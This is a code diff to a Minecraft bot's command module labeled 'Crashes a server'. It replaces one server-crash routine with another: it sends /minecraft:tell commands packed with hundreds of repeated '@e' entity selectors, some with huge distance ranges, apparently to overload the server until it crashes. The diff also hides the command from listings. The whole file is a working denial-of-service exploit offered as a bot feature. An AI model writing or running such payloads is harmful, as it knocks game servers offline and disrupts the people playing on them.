@@ -1,9 +1,9 @@
 const index=require("../../index.js");
 const cc=require("../commandblock.js");
 module.exports={
-	command:function(b,msg,sender,username){
+	command:function(b,msg,sender,username,verify){
 		const args=msg.split(" ");
-		if(sender!=="00000000-0000-0000-0000-Console00000" && args.length>=2){
+		if(!verify && args.length>=2){
 			b.send("This command is not able to select a server, unless being run from console.")
 			return;
 		}
@@ -12,6 +12,9 @@ module.exports={
 			server=+args[1];
 		} else {
 			server=0;
+		}
+		if(index.bots[server].o.partial_op || index.bots[server].o.deop){
+			b.send("Operator access is required to crash server "+server+".")
 		}
 		let delay;
 		if(args[2]!=="silent"){
@@ -38,16 +41,16 @@ module.exports={
 			delay=500;
 		}
 		setTimeout(()=>{
-			for(let i=0;i<=cc.cs-1;i++){
-				for(let j=0;j<=cc.cs-1;j++){
-					for(let k=0;k<=cc.cs-1;k++){
-						index.bots[server].send("/kick @a @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e")
-					}
-				}
+			const array=new Array(700).fill("@e[distance =1..2147483647]").join("@e"); 
+			const array2=new Array(700).fill("@e").join("@e"); 
+			for(let i=0;i<=20;i++){
+				index.bots[server].ccq.push('/minecraft:tell @a '+array)
+				index.bots[server].ccq.push('/minecraft:tell @a '+array2)
 			}
 		},delay)
 	},
 	desc: "Crashes a server",
-	usage: " [server]"
+	usage: " [server]",
+	hidden: true
 }
 
